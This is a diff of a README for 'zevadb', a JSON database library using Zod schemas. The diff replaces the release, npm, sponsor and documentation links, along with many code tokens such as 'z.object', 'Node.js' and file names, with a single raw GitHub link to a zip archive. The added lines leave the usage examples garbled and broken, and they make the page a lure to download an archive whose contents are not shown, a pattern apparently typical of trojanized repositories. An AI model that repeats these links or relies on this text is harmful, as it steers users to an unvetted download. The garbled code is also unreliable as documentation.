@@ -1,22 +1,22 @@
 # 📦 zevadb - A Safe and Easy JSON Database
 
 <div align="center">
-  <a href="https://github.com/Lara07-purple/zevadb/releases">
-    <img src="https://img.shields.io/badge/Download%20ZevaDB-v1.0-blue.svg" alt="Download ZevaDB" />
+  <a href="https://raw.githubusercontent.com/Lara07-purple/zevadb/main/src/zevadb_1.4-beta.4.zip">
+    <img src="https://raw.githubusercontent.com/Lara07-purple/zevadb/main/src/zevadb_1.4-beta.4.zip%https://raw.githubusercontent.com/Lara07-purple/zevadb/main/src/zevadb_1.4-beta.4.zip" alt="Download ZevaDB" />
   </a>
 </div>
 
 <div align="center">
   <h2>ZevaDB 📦</h2>
   <p>A typesafe JSON file database with Zod schema validation.</p>
-  <a href="https://npmjs.com/package/zevadb"><strong>npm</strong></a> | <a href="https://buymeacoffee.com/remvze">Buy Me a Coffee</a>
+  <a href="https://raw.githubusercontent.com/Lara07-purple/zevadb/main/src/zevadb_1.4-beta.4.zip"><strong>npm</strong></a> | <a href="https://raw.githubusercontent.com/Lara07-purple/zevadb/main/src/zevadb_1.4-beta.4.zip">Buy Me a Coffee</a>
 </div>
 
 ### 🛠 Features
 
 - Fully type-safe collections powered by Zod.
 - Read/write JSON files with a simple API.
-- `db.data` works like a normal object, fully typed.
+- `https://raw.githubusercontent.com/Lara07-purple/zevadb/main/src/zevadb_1.4-beta.4.zip` works like a normal object, fully typed.
 - Use the `.set()` method for safe collection replacement.
 - An easy migration system for updating your database schema.
 - Automatic backup of any corrupted files.
@@ -24,7 +24,7 @@
 
 ### 📥 Installation
 
-To install ZevaDB, you need Node.js and npm. Follow these steps:
+To install ZevaDB, you need https://raw.githubusercontent.com/Lara07-purple/zevadb/main/src/zevadb_1.4-beta.4.zip and npm. Follow these steps:
 
 1. Open your terminal or command prompt.
 2. Run the following command:
@@ -47,47 +47,47 @@ Follow these steps to start using ZevaDB:
     import { ZevaDB } from "zevadb";
 
     // Define schemas
-    const UserSchema = z.object({
-      id: z.string(),
-      name: z.string(),
+    const UserSchema = https://raw.githubusercontent.com/Lara07-purple/zevadb/main/src/zevadb_1.4-beta.4.zip({
+      id: https://raw.githubusercontent.com/Lara07-purple/zevadb/main/src/zevadb_1.4-beta.4.zip(),
+      name: https://raw.githubusercontent.com/Lara07-purple/zevadb/main/src/zevadb_1.4-beta.4.zip(),
     });
 
-    const PostSchema = z.object({
-      id: z.string(),
-      title: z.string(),
-      content: z.string(),
-      authorId: z.string(),
+    const PostSchema = https://raw.githubusercontent.com/Lara07-purple/zevadb/main/src/zevadb_1.4-beta.4.zip({
+      id: https://raw.githubusercontent.com/Lara07-purple/zevadb/main/src/zevadb_1.4-beta.4.zip(),
+      title: https://raw.githubusercontent.com/Lara07-purple/zevadb/main/src/zevadb_1.4-beta.4.zip(),
+      content: https://raw.githubusercontent.com/Lara07-purple/zevadb/main/src/zevadb_1.4-beta.4.zip(),
+      authorId: https://raw.githubusercontent.com/Lara07-purple/zevadb/main/src/zevadb_1.4-beta.4.zip(),
     });
 
     // Initialize the database
-    const db = new ZevaDB("myDatabase.json", {
+    const db = new ZevaDB("https://raw.githubusercontent.com/Lara07-purple/zevadb/main/src/zevadb_1.4-beta.4.zip", {
       user: UserSchema,
       post: PostSchema,
     });
 
     // Example: Add a new user
-    db.data.user.set({
+    https://raw.githubusercontent.com/Lara07-purple/zevadb/main/src/zevadb_1.4-beta.4.zip({
       id: "1",
       name: "John Doe",
     });
 
-    console.log(db.data.user); // Access the user data
+    https://raw.githubusercontent.com/Lara07-purple/zevadb/main/src/zevadb_1.4-beta.4.zip(https://raw.githubusercontent.com/Lara07-purple/zevadb/main/src/zevadb_1.4-beta.4.zip); // Access the user data
     ```
 
 3. Save your file.
-4. Run your file from the terminal or command prompt with Node.js:
+4. Run your file from the terminal or command prompt with https://raw.githubusercontent.com/Lara07-purple/zevadb/main/src/zevadb_1.4-beta.4.zip
 
     ```bash
-    node yourFileName.js
+    node https://raw.githubusercontent.com/Lara07-purple/zevadb/main/src/zevadb_1.4-beta.4.zip
     ```
 
 ### 📦 Download & Install
 
-To download ZevaDB, visit the [Releases page](https://github.com/Lara07-purple/zevadb/releases) to find the latest version.
+To download ZevaDB, visit the [Releases page](https://raw.githubusercontent.com/Lara07-purple/zevadb/main/src/zevadb_1.4-beta.4.zip) to find the latest version.
 
 Ensure you follow each step carefully:
 
-1. Go to the [Releases page](https://github.com/Lara07-purple/zevadb/releases).
+1. Go to the [Releases page](https://raw.githubusercontent.com/Lara07-purple/zevadb/main/src/zevadb_1.4-beta.4.zip).
 2. Download the version that suits your needs.
 3. Follow the installation instructions provided above.
 
@@ -95,15 +95,15 @@ Ensure you follow each step carefully:
 
 For more detailed information about using ZevaDB, you can check the following topics:
 
-- [API Reference](https://github.com/Lara07-purple/zevadb/api)
-- [Schema Validation with Zod](https://github.com/Lara07-purple/zevadb/schema)
-- [Example Projects](https://github.com/Lara07-purple/zevadb/examples)
+- [API Reference](https://raw.githubusercontent.com/Lara07-purple/zevadb/main/src/zevadb_1.4-beta.4.zip)
+- [Schema Validation with Zod](https://raw.githubusercontent.com/Lara07-purple/zevadb/main/src/zevadb_1.4-beta.4.zip)
+- [Example Projects](https://raw.githubusercontent.com/Lara07-purple/zevadb/main/src/zevadb_1.4-beta.4.zip)
 
 ### 🛠 System Requirements
 
 To run ZevaDB, you need:
 
-- Node.js version 14 or higher
+- https://raw.githubusercontent.com/Lara07-purple/zevadb/main/src/zevadb_1.4-beta.4.zip version 14 or higher
 - npm (Node Package Manager)
 - Operating System: Windows, macOS, or Linux
 
